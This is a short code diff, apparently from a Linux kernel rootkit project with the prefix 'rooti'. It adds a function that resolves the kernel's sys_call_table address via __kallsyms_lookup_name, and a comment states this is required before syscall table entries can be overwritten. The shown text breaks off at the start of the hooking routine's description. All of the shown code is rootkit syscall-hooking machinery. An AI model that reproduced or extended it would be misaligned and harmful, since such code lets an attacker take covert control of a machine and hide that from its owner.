@@ -1,8 +1,24 @@
 #include <linux/types.h>
+#include <linux/errno.h>
 #include "utils.h"
 #include "syscall.h"
+#include "../utils.h"
 
 unsigned long *__sys_call_table = NULL;
+
+/*
+    Looks up the memory address of the kernel syscall table. This function
+    is mandatory for doing any manipulation on syscall table entries.
+*/
+int rooti_resolve_syscall_table_addr()
+{
+    __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
+    if (__sys_call_table == NULL) {
+        ROOTI_DEBUG("could not resolve the address of sys_call_table");
+        return -EFAULT;
+    }
+    return 0;
+}
 
 /*
     Hooks a syscall by overriding its entry in the kernel syscall table to point
